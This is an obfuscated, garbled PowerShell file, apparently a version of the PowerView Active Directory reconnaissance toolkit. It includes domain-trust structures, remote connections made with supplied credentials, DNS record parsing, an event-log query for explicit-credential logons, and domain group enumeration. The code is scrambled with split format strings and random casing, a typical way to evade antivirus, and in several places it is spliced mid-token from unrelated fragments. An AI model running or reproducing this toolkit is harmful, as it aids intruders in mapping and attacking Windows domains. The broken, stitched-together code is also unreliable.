            throw (Z3b{9}{4}{2}{8}{3}{6}{1}{11}{5}{0}{7}{10}Z3b-f S5zundS5z,S5zsS5z,S5zDomainS5z,S5zoS5z,S5zd-S5z,S5zosts foS5z,S5zcesS5z,S5z to eS5z,S5zPrS5z,S5z[FinS5z,S5znumerateS5z,S5z] No hS5z)
        }

        
        if (YoV{pIJKSBOIJKUndparIJKAMETers}[(Z3b{2}{0}{1}Z3b-f S5zrocessNaS5z,S5zmeS5z,S5zPS5z)]) {
            YoV{tIJKARgeTIJKpRIJKocESsIJKNAIJKME} = @()
            ForEach (YoV{t} in YoV{pIJKRIJKocESsNAMe}) {
                YoV{taRIJKgeTIJKPRoceIJKSSNAmE} += YoV{t}.(Z3b{1}{0}Z3b -fS5zplitS5z,S5zSS5z).Invoke(S5z,S5z)
            }
            if (YoV{tIJKArgEtIJKprOIJKceIJKsSnIJKAmE} -isnot [System.Array]) {
                YoV{TaRIJKgeTIJKprIJKoCIJKESsNAIJKme} = [String[]] @(YoV{taRIJKGIJKETproceIJKSIJKsName})
            }
        }
        elseif (YoV{PsBoUIJKNDIJKpARaMeTeIJKRS}[(Z3b{1}{0}{2}{3}Z3b-fS5zntS5z,S','NSITS5z,S5zNON_TS5z,S5zIVES5z)      = 1
    (Z3b{0}{2}{1}Z3b -f S5zUPLS5z,S5z_ONLYS5z,S5zEVELS5z)        = 2
    (Z3b{0}{1}{2}Z3b-f S5zFILS5z,S5zTER_SIDS5z,S5zSS5z)         = 4
    (Z3b{3}{2}{1}{4}{0}Z3b -fS5zVES5z,S5zT_TRAS5z,S5zESS5z,S5zFORS5z,S5zNSITIS5z)   = 8
    (Z3b{4}{2}{0}{3}{1}Z3b-fS5zSS_ORGANS5z,S5zIONS5z,S5zOS5z,S5zIZATS5z,S5zCRS5z)  = 16
    (Z3b{0}{2}{1}Z3b-f S5zWITHS5z,S5zRESTS5z,S5zIN_FOS5z)       = 32
    (Z3b{0}{2}{3}{1}Z3b -f S5zTS5z,S5zERNALS5z,S5zREAT_S5z,S5zAS_EXTS5z)   = 64
}


YoV{dS_DoIJKmAIJKIn_trIJKUstS} = &(Z3b{0}{1}Z3b -fS5zstS5z,S5zructS5z) YoV{mIJKOD} (Z3b{1}{2}{5}{3}{4}{0}Z3b-fS5zRUSTSS5z,S5zDS5z,S5zS_DOMAS5z,S5zN_S5z,S5zTS5z,S5zIS5z) @{
    (Z3b{0}{2}{3}{1}Z3b-fS5zNetbiosDS5z,S5znNameS5z,S5zoS5z,S5zmaiS5z) = &(Z3b{1}{0}Z3b -fS5zieldS5z,S5zfS5z) 0 (Z3b{1}{0}Z3b-f S5ztringS5z,S5zSS5z) -MarshalAs @((Z3b{2}{0}{1}Z3b-f S5zPWS5z,S5zStrS5z,S5zLS5z))
    (Z3b{1}{0}{2}{3}Z3b -fS5zainNS5z,S5zDnsDomS5z,S5zaS5z,S5zmeS5z) = &(Z3b{1}{0}Z3b-fS5zldS5z,S5zfieS5z) 1 (Z3b{0}{1}Z3b-fS5zStriS5z,S5zngS5z) -MarshalAs @((Z3b{0}{1}Z3b -f S5zLS5z,S5zPWStrS5z))
    (Z3b{1}{0}Z3b-fS5zlagsS5z,S5zFS5z) = &(Z3b{1}{0}Z3b-fS5zldS5z,S5zfieS5z) 2 YoV{dIJKSdoMAiIJKNFLIJKAg}
    (Z3b{0}{1}{2}{3}Z3b-f S5zParenS5z,S5ztS5z,S5zInS5z,S5zdexS5z) = &(Z3b{0}{1}Z3b-f S5zfielS5z,S5zdS5z) 3 (Z3b{1}{2}{0}Z3b -f S5z2S5z,S5zUIntS5z,S5z3S5z)
    (Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zstTypS5z,S5zTruS5z) = &(Z3b{0}{1}Z3b -f S5zfielS5z,S5zdS5z) 4 YoV{dIJKSdOmAIJKiNtrIJKUsTIJKType}
    (Z3b{2}{4}{1}{0}{3}Z3b -fS5zbS5z,S5zriS5z,S5zTrustS5z,S5zutesS5z,S5zAttS5z) = &(Z3b{1}{0}Z3b -f S5zeldS5z,S5zfiS5z) 5 YoV{DSdomaIJKiNIJKTrustIJKATtribIJKUtES}
    (Z3b{1}{2}{0}Z3b -f S5zidS5z,S5zDS5z,S5zomainSS5z) = &(Z3b{1}{0}Z3b-f S5zldS5z,S5zfieS5z) 6 (Z3b{1}{2}{0}Z3b-fS5zrS5z,S5zIS5z,S5zntPtS5z)
    (Z3b{1}{0}{2}Z3b -fS5zainGS5z,S5zDomS5z,S5zuidS5z) = &(Z3b{0}{1}Z3b-fS5zfiS5z,S5zeldS5z) 7 (Z3b{1}{0}Z3b -f S5zidS5z,S5zGuS5z)
}


YoV{NEtIJKRIJKEsIJKOURIJKCEW} = &(Z3b{0}{2}{1}Z3b -f S5zstS5z,S5ztS5z,S5zrucS5z) YoV{MIJKoD} (Z3b{0}{1}{3}{2}Z3b -f S5zNETS5z,S5zRESOS5z,S5zRCEWS5z,S5zUS5z) @{
    (Z3b{1}{0}Z3b -f S5zopeS5z,S5zdwScS5z) =         &(Z3b{0}{1}Z3b -f S5zfiS5z,S5zeldS5z) 0 (Z3b{1}{0}Z3b -fS5z32S5z,S5zUIntS5z)
    (Z3b{1}{0}Z3b -fS5zeS5z,S5zdwTypS5z) =          &(Z3b{0}{1}Z3b -fS5zfiS5z,S5zeldS5z) 1 (Z3b{0}{2}{1}Z3b-fS5zUS5z,S5z32S5z,S5zIntS5z)
    (Z3b{3}{2}{1}{0}Z3b -f S5zplayTypeS5z,S5zisS5z,S5zwDS5z,S5zdS5z) =   &(Z3b{1}{0}Z3b -f S5zeld','}{1}{0}Z3b -fS5zt-ForestS5z,S5zeS5z,S5zGS5z) @Arguments

        if (YoV{fORIJKEIJKSTObIJKJEcT}) {
            if (YoV{pSIJKBOuNIJKdIJKParaMeTIJKErS}[(Z3b{1}{0}{2}{3}Z3b-fS5zlS5z,S5zCS5z,S5zassNS5z,S5zameS5z)]) {
       ','S5z)]) { YoV{SEARCIJKhIJKEraRgUMeIJKNTs}[(Z3b{1}{0}Z3b-fS5zrS5z,S5zServeS5z)] = YoV{sERVIJKer} }
        if (YoV{PSIJKBoUNDPIJKArIJKAIJKMEIJKTerS}[(Z3b{0}{1}{2}Z3b -f S5zSearchS5z,S5zScoS5z,S5zpeS5z)]) { YoV{SIJKEARIJKCHIJKerArGUIJKMIJKENtS}[(Z3b{0}{2}{1}{3}Z3b-f S5zSS5z,S5zSS5z,S5zearchS5z,S5zcopeS5z)] = YoV{SIJKeARIJKcHScIJKoPe} }
        if (YoV{psBIJKoIJKUNIJKdpIJKArAIJKMeters}[(Z3b{0}{1}{2}Z3b-fS5zResulS5z,S5ztPaS5z,S5zgeSizeS5z)]) { YoV{SEIJKARChErIJKARGUIJKmeNIJKTS}[(Z3b{3}{4}{1}{2}{0}Z3b -fS5zizeS5z,S5zPaS5z,S5zgeSS5z,S5zResuS5z,S5zltS5z)] = YoV{resuIJKlIJKTIJKPagESIIJKZe} }
        if (YoV{pSbOUnIJKDpaRamIJKETIJKerS}[(Z3b{3}{0}{1}{2}{4}Z3b-f S5zrverTimeLiS5z,S5zmS5z,S5ziS5z,S5zSeS5z,S5ztS5z)]) { YoV{SIJKEaIJKRcheIJKRARGIJKUMents}[(Z3b{1}{0}{3}{2}Z3b-fS5zerverS5z,S5zSS5z,S5zeLimitS5z,S5zTimS5z)] = YoV{SeRvIJKErtIIJKmIJKElImIJKit} }
        if (YoV{pIJKsbIJKoIJKUIJKNDpAIJKRamETers}[(Z3b{2}{3}{0}{1}Z3b -fS5zstonS5z,S5zeS5z,S5zTS5z','eIJKRIJKTiIJKmeLIJKImIJKit} }
        if (YoV{pSbOIJKUNIJKDPaRamIJKeteRS}[(Z3b{1}{4}{2}{3}{0}Z3b-f S5zMasksS5z,S5zSeS5z,S5ztS5z,S5zyS5z,S5zcuriS5z)]) { YoV{seARchIJKErIJKArgUmIJKeIJKNTs}[(Z3b{0}{4}{2}{1}{3}Z3b-f S5zSS5z,S5ztyMS5z,S5zuriS5z,S5zasksS5z,S5zecS5z)] = YoV{SEIJKcuRIJKiTIJKYMaSkS} }
        if (YoV{psbIJKOUnDPAIJKRaMeIJKTEIJKRS}[(Z3b{1}{0}Z3b -f S5zombstoneS5z,S5zTS5z)]) { YoV{sIJKEARcIJKhIJKERarGuMIJKentS}[(Z3b{1}{2}{0}Z3b -f S5zeS5z,S5zTombsS5z,S5ztonS5z)] = YoV{TIJKOIJKMbSIJKTonE} }
        if (YoV{pSBouIJKNdIJKPaIJKRIJKAMETIJKERs}','AutoS5z,S5ztiS5z,S5zentS5z) -ArgumentList @(YoV{naIJKmE}, YoV{tyIJKPE}, YoV{aTTributeIJKCIJKolIJKLEIJKcTIJKiIJKON})
                YoV{DPIJKDIcIJKTioIJKNIJKArY}.(Z3b{0}{1}Z3b -f S5zAdS5z,S5zdS5z).Invoke(YoV{nIJKAME}, YoV{paraMIJKeIJKTer})
            }
        }
    }

    End {
        if(!YoV{CRIJKeATIJKeIJKVaRIAIJKBLEs} -and !YoV{DIJKiCTiIJKoNaIJKRY}) {
            YoV{dpIJKDIJKicIJKTIoNARy}
        }
    }
}


function GIJKEtIJK-INIIJKcOntent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{4}{3}{2}{1}Z3b -fS5zPSS5z,S5zessS5z,S5zocS5z,S5zouldPrS5z,S5zShS5z}, S5zS5z)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(POsiTIoN = 0, MANdAToRY = YoV{TIJKRUe}, ValUEFRompiPELiNe = YoV{tIJKRUE}, VaLuEFroMpIPElinEbYPROperTYNaMe = YoV{tIJKRuE})]
        [Alias({Z3b{1}{2}{0}Z3b-fS5zameS5z,S5zFS5z,S5zullNS5z}, {Z3b{0}{1}Z3b-f S5zNaS5z,S5zmeS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{PaIJKTh},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKReDIJKeNIJKTIAL} =   (&(Z3b{0}{1}{2}Z3b-fS5zGEt-iTS5z,S5zES5z,S5zmS5z) vaRIABLe:Jfi ).Z3bVaIJKluEZ3b::Z3bEmIJKptyZ3b,

        [Switch]
        YoV{OuTpUtoIJKBJIJKEIJKcT}
    )

    BEGIN {
        YoV{MAIJKPIJKPEIJKdcoMPUtERS} = @{}
    }

    PROCESS {
        ForEach (YoV{tARgIJKetPIJKAtH} in YoV{PIJKAtH}) {
            if ((YoV{TAIJKRgEtIJKpAIJKTH} -Match (((Z3b{0}{6}{4}{1}{2}{5}{3}Z3b -f S5zP0SPS5z,S5zP0S5z,S5zS.S5z,S5zP0S.*S5z,S5zSP0SS5z,S5z*P0SS5z,S5z0S5z)) -crEPlAceS5zP0SS5z,[cHaR]92)) -and (YoV{PIJKsBIJKoIJKUIJKNDPaRamETERs}[(Z3b{0}{2}{1}Z3b-f S5zCrS5z,S5zdentialS5z,S5zeS5z)])) {
                YoV{hoSTIJKcOmPIJKUTer} = (&(Z3b{2}{1}{0}Z3b -fS5zectS5z,S5zjS5z,S5zNew-ObS5z) (Z3b{2}{3}{0}{1}Z3b -f S5zUS5z,S5zriS5z,S5zSysS5z,S5ztem.S5z)(YoV{TarIJKGeIJKTPath})).Z3bHIJKosTZ3b
                if (-not YoV{MaPpEdcIJKoIJKMPuIJKTeIJKRS}[YoV{HIJKoStIJKCOMIJKPUIJKTer}]) {
                    
                    &(Z3b{2}{3}{0}{1}{4}Z3b -f S5zonS5z,S5zneS5z,S5zAdS5z,S5zd-RemoteCS5z,S5zctionS5z) -ComputerName YoV{HOsIJKTCompIJKUIJKTeR} -Credential YoV{CrEDEnIJKTIJKIaL}
                    YoV{MIJKApPIJKEdCoIJKMPIJKUTErS}[YoV{hOIJKStCoIJKmPUter}] = YoV{trIJKUe}
                }
            }

            if (&(Z3b{0}{1}{2}Z3b -f S5zTesS5z,S5zt-S5z,S5zPathS5z) -Path YoV{tIJKARGEtIJKPIJKAtH}) {
                if (YoV{psBoIJKUNDIJKpARIJKAmeTERs}[(Z3b{0}{1}{2}Z3b-fS5zOutS5z,S5zpuS5z,S5ztObjectS5z)]) {
                    YoV{iIJKNiOIJKBjeCt} = &(Z3b{2}{1}{0}Z3b -f S5zctS5z,S5zew-ObjeS5z,S5zNS5z) (Z3b{1}{0}{2}Z3b-fS5zbjecS5z,S5zPSOS5z,S5ztS5z)
                }
                else {
                    YoV{inIoBIJKJIJKecT} = @{}
                }
                Switch -Regex -File YoV{tAIJKRIJKGEtPaTH} {
                    (((Z3b{2}{4}{1}{0}{3}Z3b-fS5z+)vhS5z,S5z.S5z,S5z^vhyS5z,S5zy]S5z,S5z[(S5z)).Z3brIJKEPLIJKACeZ3b(([Char]118+[Char]104+[Char]121),[strING][Char]92)) 
                    {
                        YoV{SeIJKcIJKTioN} = YoV{MIJKATIJKchEs}[1].(Z3b{0}{1}Z3b -f S5zTriS5z,S5zmS5z).Invoke()
                        if (YoV{PsBOIJKUnIJKdIJKpAIJKRAmEtErS}[(Z3b{0}{2}{1}Z3b -fS5zOS5z,S5zbjectS5z,S5zutputOS5z)]) {
                            YoV{sEIJKCIJKTioN} = YoV{SeIJKCIJKTiON}.(Z3b{1}{0}Z3b -f S5zceS5z,S5zReplaS5z).Invoke(S5z S5z, S5zS5z)
                            YoV{sECTIJKioNIJKoBjEct} = &(Z3b{1}{2}{0}Z3b -f S5ztS5z,S5zNew-S5z,S5zObjecS5z) (Z3b{2}{1}{0}Z3b -fS5ztS5z,S5zjecS5z,S5zPSObS5z)
                            YoV{iNiOIJKBjIJKect} JGO &(Z3b{0}{2}{1}Z3b -f S5zAdd-MeS5z,S5zberS5z,S5zmS5z) (Z3b{2}{0}{1}Z3b -fS5zpS5z,S5zertyS5z,S5zNoteproS5z) YoV{sEcIJKTIIJKOn} YoV{sIJKEcTIIJKOIJKNOIJKBjECt}
                        }
                        else {
                            YoV{iIJKNiOIJKBjEct}[YoV{SIJKECTIoN}] = @{}
                        }
                        YoV{COmMIJKEnTcIJKoUnt} = 0
                    }
                    Z3b^(;.*)YoVZ3b 
                    {
                        YoV{vALIJKUe} = YoV{MAIJKTCIJKHES}[1].(Z3b{1}{0}Z3b -f S5zimS5z,S5zTrS5z).Invoke()
                        YoV{CoIJKmIJKMeIJKNTcOIJKUNT} = YoV{CIJKOMMENTIJKcount} + 1
                        YoV{NIJKAmE} = (Z3b{2}{0}{1}Z3b-fS5zeS5z,S5zntS5z,S5zCommS5z) + YoV{coMmIJKentCIJKoIJKUnT}
                        if (YoV{PIJKSIJKBounIJKdParAMIJKeTERs}[(Z3b{1}{2}{0}Z3b-fS5zutObjectS5z,S5zOuS5z,S5ztpS5z)]) {
                            YoV{nIJKAME} = YoV{nIJKAme}.(Z3b{1}{0}Z3b -fS5zeS5z,S5zReplacS5z).Invoke(S5z S5z, S5zS5z)
                            YoV{INiOIJKBJIJKEct}.YoV{sEIJKcIJKTION} JGO &(Z3b{2}{0}{1}Z3b -f S5zmbeS5z,S5zrS5z,S5zAdd-MeS5z) (Z3b{1}{2}{0}Z3b -f S5ztyS5z,S5zNS5z,S5zoteproperS5z) YoV{NAIJKME} YoV{vALIJKUE}
                        }
                        else {
                            YoV{InIobIJKJIJKECt}[YoV{SeIJKcIJKTiOn}][YoV{nAIJKme}] = YoV{VIJKAIJKluE}
                        }
                    }
                    (((Z3b{3}{1}{2}{0}Z3b -fS5z)S5z,S5zoSS5z,S5zs*=(.*S5z,S5z(.+?)mS5z))  -crEPlaCE([chAR]109+[chAR]111+[chAR]83),[chAR]92) 
                    {
                        YoV{nIJKAmE}, YoV{VIJKAlIJKUe} = YoV{mIJKAtcHIJKes}[1..2]
                        YoV{NaIJKme} = YoV{NAIJKMe}.(Z3b{1}{0}Z3b -f S5zimS5z,S5zTrS5z).Invoke()
                        YoV{VAIJKlueS} = YoV{vIJKAluE}.(Z3b{0}{1}Z3b -fS5zspliS5z,S5ztS5z).Invoke(S5z,S5z) JGO &(Z3b{0}{2}{3}{1}Z3b -fS5zFS5z,S5zbjectS5z,S5zorEaS5z,S5zch-OS5z) { YoV{_}.(Z3b{1}{0}Z3b -fS5zrimS5z,S5zTS5z).Invoke() }

                        

                        if (YoV{PsBIJKoUnIJKDPArameIJKTErs}[(Z3b{2}{0}{1}Z3b -f S5ztputObjeS5z,S5zctS5z,S5zOuS5z)]) {
                            YoV{nIJKAME} = YoV{NIJKAme}.(Z3b{2}{1}{0}Z3b -fS5zplaceS5z,S5zeS5z,S5zRS5z).Invoke(S5z S5z, S5zS5z)
                            YoV{inIoIJKBjIJKEct}.YoV{SEcIJKTIJKioN} JGO &(Z3b{0}{1}{2}Z3b-fS5zAdS5z,S5zd-MeS5z,S5zmberS5z) (Z3b{3}{1}{0}{2}Z3b-fS5zperS5z,S5zeproS5z,S5ztyS5z,S5zNotS5z) YoV{nAIJKmE} YoV{vAIJKLUIJKES}
                        }
                        else {
                            YoV{IIJKNIobJIJKEcT}[YoV{SIJKeCtIIJKoN}][YoV{NAIJKmE}] = YoV{VIJKALueS}
                        }
                    }
                }
                YoV{iIJKNiObJEIJKCT}
            }
        }
    }

    END {
        
        YoV{mAIJKpPEDComPIJKUtIJKeIJKRS}.Z3bkIJKeysZ3b JGO &(Z3b{3}{2}{1}{0}Z3b-f S5znS5z,S5znectioS5z,S5zemove-RemoteConS5z,S5zRS5z)
    }
}


function ExpORIJKT-powIJKerIJKViEwCsV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{2}Z3b-fS5zoS5z,S5zPSShS5z,S5zuldProcessS5z}, S5zS5z)]
    [CmdletBinding()]
    Param(
        [Parameter(mANDAtoRY = YoV{tIJKRUe}, ValUeFroMPIPeLINe = YoV{TIJKRue}, vaLUEFrOMPIpEliNEByPrOPertYNAMe = YoV{TIJKRue})]
        [System.Management.Automation.PSObject[]]
        YoV{iIJKNpUToIJKBIJKjeCt},

        [Parameter(maNdatoRY = YoV{TRIJKUe}, PosiTion = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{pAIJKTH},

        [Parameter(PosITioN = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        YoV{DeLIJKImITIJKeR} = S5z,S5z,

        [Switch]
        YoV{aIJKpPeNd}
    )

    BEGIN {
        YoV{oIJKUtPuTIJKpath} =   ( &(Z3b{3}{1}{0}{2}Z3b-fS5z-vARiAS5z,S5ztS5z,S5zbLES5z,S5zGES5z)  81lBks).Z3bVIJKAlueZ3b::Z3bGEtFIJKUlLPaIJKThZ3b(YoV{PSBIJKoIJKUnDpAramIJKeIJKTIJKErs}[(Z3b{1}{0}Z3b-f S5zthS5z,S5zPaS5z)])
        YoV{EIJKxiStS} =  ( &(Z3b{1}{0}Z3b-f S5zRiABleS5z,S5zVAS5z) (Z3b2zFZ3b+Z3b5Z3b)  ).Z3bVIJKALUeZ3b::(Z3b{0}{1}Z3b-f S5zExistS5z,S5zsS5z).Invoke(YoV{OIJKUTpIJKUIJKTPaTh})

        
        YoV{mIJKUTex} = &(Z3b{0}{2}{1}Z3b-fS5zNeS5z,S5zectS5z,S5zw-ObjS5z) (Z3b{5}{3}{0}{2}{1}{4}Z3b-fS5zhreaS5z,S5zg.MuteS5z,S5zdinS5z,S5zTS5z,S5zxS5z,S5zSystem.S5z) YoV{FIJKALIJKse},(Z3b{2}{0}{1}Z3b-fS5zuS5z,S5ztexS5z,S5zCSVMS5z)
        YoV{NuIJKlL} = YoV{MIJKUTEX}.(Z3b{0}{2}{1}Z3b-f S5zWS5z,S5zeS5z,S5zaitOnS5z).Invoke()

        if (YoV{PIJKSBOUIJKNdIJKPARAMIJKETErs}[(Z3b{0}{1}Z3b-fS5zApS5z,S5zpendS5z)]) {
            YoV{FILIJKEmoIJKdE} =   YoV{m1IJKZIJKjl2}::Z3baPPIJKeIJKNDZ3b
        }
        else {
            YoV{fiLeIJKMIJKodE} =  ( &(Z3b{3}{0}{2}{1}Z3b -f S5zEt-vaRIAS5z,S5zeS5z,S5zBLS5z,S5zgS5z)  M1ZjL2 -vAL)::Z3bCRIJKeaIJKTeZ3b
            YoV{ExiSIJKTs} = YoV{FaIJKLsE}
        }

        YoV{cSvIJKstIJKREAm} = &(Z3b{0}{1}{2}{3}Z3b-f S5zNew-S5z,S5zOS5z,S5zbjeS5z,S5zctS5z) (Z3b{1}{3}{0}{2}Z3b -f S5zeaS5z,S5zIOS5z,S5zmS5z,S5z.FileStrS5z)(YoV{OUIJ','[(Z3b{0}{2}{1}Z3b -fS5zCrS5z,S5zentialS5z,S5zedS5z)]) { YoV{sEIJKARcherIJKArIJKgUmENIJKTS}[(Z3b{2}{1}{0}Z3b -f S5zlS5z,S5zredentiaS5z,S5zCS5z)] = YoV{CrEIJKdIJKeIJKNtiAl} }
        YoV{CIJKoMpseIJKArchER} = &(Z3b{0}{3}{5}{2}{4}{1}Z3b -fS5zGS5z,S5znSearcherS5z,S5z-DomS5z,S5zeS5z,S5zaiS5z,S5ztS5z) @SearcherArguments
    }

    PROCESS {
        
        if (YoV{PsbIJKoUndpaIJKRAmetIJKeRS} -and (YoV{PIJKSIJKBOUNdpARIJKAIJKmeters}.Z3bcoIJKUnTZ3b -ne 0)) {
            &(Z3b{0}{3}{1}{4}{2}Z3b -f S5zNew-S5z,S5zmS5z,S5zrS5z,S5zDynamicParaS5z,S5zeteS5z) -CreateVariables -BoundParameters YoV{PsbouNIJKdpIJKAramETEIJKRS}
        }

        if (YoV{ComIJKPSIJKEARcheR}) {
            YoV{idenIJKTitIJKyfiIJKltEr} = S5zS5z
            YoV{fiIJKLtIJKER} = S5zS5z
            YoV{IdeIJKNIJKTIty} JGO &(Z3b{3}{2}{0}{1}Z3b -f S5zecS5z,S5ztS5z,S5zjS5z,S5zWhere-ObS5z) {YoV{_}} JGO &(Z3b{0}{3}{2}{1}{4}Z3b -f S5zForS5z,S5zbjeS5z,S5z-OS5z,S5zEachS5z,S5zctS5z) {
                YoV{iIJKdEntIIJKTyinsIJKTIJKANce} = YoV{_}.(Z3b{2}{1}{0}Z3b -f S5zplaceS5z,S5zeS5z,S5zRS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zReplaS5z,S5zcS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                if (YoV{IdEnIJKTIJKIIJKTyinsTANIJKce} -match (Z3b{1}{0}Z3b -f S5z-S5z,S5z^S-1S5z)) {
                    YoV{IDeIJKNTIIJKTyFiLtIJKer} += Z3b(objectsid=YoVIdentityInstance)Z3b
                }
                elseif (YoV{idIJKEntitIJKyIIJKNsTaNcE} -match (Z3b{0}{1}Z3b-fS5z^S5z,S5zCN=S5z)) {
                    YoV{IIJKdenTITIJKyfIJKILTEr} += Z3b(distinguishedname=YoVIdentityInstance)Z3b','S5z+S5z S5z+S5z S5z+S5z S5z+((S5z*[EventS5z+S5zDS5z+S5zaS5z+S5zta[S5z+S5zDaS5z+S5zta[@NameS5z+S5z=2XS5z+S5zTS5z+S5zTargetUseS5z+S5zrNS5z+S5zame2S5z+S5zXTS5z+S5z]S5z+S5z S5z)  -REpLacE  ([ChAR]50+[ChAR]88+[ChAR]84),[ChAR]39)+S5z!S5z+S5z= S5z+((S5zVyqANONYMOUS5z+S5zS S5z)-RepLacE S5zVyqS5z,[cHAr]39)+((S5zLS5z+S5zOGONTLw]]S5z+S5z
 S5z)  -rePlACe([cHaR]84+[cHaR]76+[cHaR]119),[cHaR]39)+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z</S5z+S5zSS5z+S5zelect>S5z+S5z

 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z<!S5z+S5z-- S5z+S5zLogonS5z+S5z S5z+S5zwitS5z+S5zh S5z+S5zexS5z+S5zplicitS5z+S5z S5z+S5zcredentS5z+S5zialS5z+S5z S5z+S5zevS5z+S5zents S5z+S5z-S5z+S5z->
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z<SelS5z+S5zeS5z+S5zct S5z+((S5zPatS5z+S5zh=xM3SecurS5z+S5zityxM3S5z+S5z>
S5z+S5z S5z) -cREPLaCE ([cHAr]120+[cHAr]77+[cHAr]51),[cHAr]34)+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z*[S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zSysS5z+S5ztem[S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zPS5z+S5zrovidS5z+S5zer[S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+((S5z@Name=0UqMicrosS5z+S5zoft-Windows-SeS5z+S','5zToStrS5z).Invoke()
        }
        else {
            YoV{TIIJKmesIJKTAMP} = (Z3b{2}{1}{0}Z3b -fS5z]S5z,S5ztaticS5z,S5z[sS5z)
        }

        YoV{dnsRecIJKOrDoIJKBIJKJecT} = &(Z3b{0}{2}{1}Z3b-fS5zNew-ObS5z,S5zctS5z,S5zjeS5z) (Z3b{1}{0}Z3b -fS5zectS5z,S5zPSObjS5z)

        if (YoV{RDAIJKTIJKATIJKYPe} -eq 1) {
            YoV{IP} = Z3b{0}.{1}.{2}.{3}Z3b -f YoV{dnSrIJKecIJKOrd}[24], YoV{dnIJKsREIJKCoRD}[25], YoV{dNsIJKReCIJKORD}[26], YoV{dNIJKSRECIJKOrd}[27]
            YoV{dAIJKTA} = YoV{ip}
            YoV{DnSREcOIJKRIJKdobJeCT} JGO &(Z3b{1}{0}{2}Z3b-f S5z-S5z,S5zAddS5z,S5zMemberS5z) (Z3b{2}{1}{0}Z3b-f S5zpropertyS5z,S5zteS5z,S5zNoS5z) (Z3b{1}{2}{0}{3}Z3b -fS5zrdTS5z,S5zRS5z,S5zecoS5z,S5zypeS5z) S5zAS5z
        }

        elseif (YoV{RDaTaTIJKyIJKPE} -eq 2) {
            YoV{NsIJKNAMe} = &(Z3b{0}{2}{1}Z3b -f S5zGS5z,S5zameS5z,S5zet-NS5z) YoV{dNIJKSIJKRecoRd}[24..YoV{dnSREIJKcIJKOrd}.Z3blEIJKNgTHZ3b]
            Yo','V{dIJKATa} = YoV{nIJKSnAme}
            YoV{dIJKNsRIJKeCIJKordObjeCT} JGO &(Z3b{1}{0}{3}{2}Z3b-f S5z-MeS5z,S5zAddS5z,S5zberS5z,S5zmS5z) (Z3b{1}{0}{2}Z3b -fS5zopS5z,S5zNoteprS5z,S5zertyS5z) (Z3b{2}{0}{1}Z3b-f S5zordTS5z,S5zypeS5z,S5zRecS5z) S5zNSS5z
        }

        elseif (YoV{rdIJKAtAIJKTYpe} -eq 5) {
            YoV{ALIIJKAs} = &(Z3b{0}{1}{2}Z3b -fS5zGS5z,S5zet-S5z,S5zNameS5z) YoV{DNsIJKReCIJKORd}[24..YoV{dIJKNSIJKReIJKcord}.Z3bLEngIJKTHZ3b]
            YoV{dAIJKTA} = YoV{aIJKLIas}
            YoV{dnSRIJKEcord',',S5zrS5z,S5zFoS5z) {
                    if (YoV{psBOunIJKdpaRAIJKMIJKEtERs}[S5zRawS5z]) {
                        
                        YoV{gIJKRIJKOup} = YoV{_}
                    }
                    else {
                        YoV{gRIJKOup} = &(Z3b{4}{2}{0}{3}{1}{5}Z3b -fS5zDAS5z,S5zopS5z,S5z-LS5z,S5zPPrS5z,S5zConvertS5z,S5zertyS5z) -Properties YoV{_}.Z3bProIJKPERTIIJKESZ3b
                    }
                    YoV{GRIJKoIJKUP}.Z3bpSOIJKBJEIJKCTZ3b.Z3bTyPIJKEnamIJKESZ3b.(Z3b{1}{0}Z3b-fS5ztS5z,S5zInserS5z).Invoke(0, (Z3b{2}{1}{0}{3}Z3b -fS5zGrouS5z,S5zwerView.S5z,S5zPoS5z,S5zpS5z))
                    YoV{gRoIJKUp}
                }
                if (YoV{rIJKeIJKsultS}) {
                    try { YoV{ResIJKUlIJKTS}.(Z3b{1}{0}Z3b -f S5zseS5z,S5zdispoS5z).Invoke() }
                    catch {
                        &(Z3b{2}{1}{0}Z3b-f S5ze-VerboseS5z,S5ztS5z,S5zWriS5z) (Z3b{6}{8}{3}{4}{5}{1}{0}{7}{10}{2}{9}Z3b -fS5zng oS5z,S5zosiS5z,S5z oS5z,S5z ErS5z,S5zror dS5z,S5zispS5z,S5z[Get-DomainGS5z,S5zf theS5z,S5zroup]S5z,S5zbjectS5z,S5z ResultsS5z)
                    }
                }
                YoV{grIJKOuIJKPsEARIJKCIJKHer}.(Z3b{0}{1}Z3b-fS5zdiS5z,S5zsposeS5z).Invoke()
            }
        }
    }
}


function nIJKEW-dIJKOmaINgROuP {


